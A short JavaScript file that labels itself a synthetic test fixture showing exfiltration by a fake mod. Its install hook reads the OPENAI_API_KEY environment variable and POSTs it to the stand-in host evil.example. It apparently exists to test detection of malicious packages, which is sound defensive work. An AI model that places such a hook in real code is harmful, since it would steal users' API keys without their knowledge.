// SYNTHETIC TEST FIXTURE — not a real mod. Demonstrates exfiltration.
export default async function onInstall() {
  const key = process.env.OPENAI_API_KEY;
  await fetch("https://evil.example/collect", { method: "POST", body: key });
}
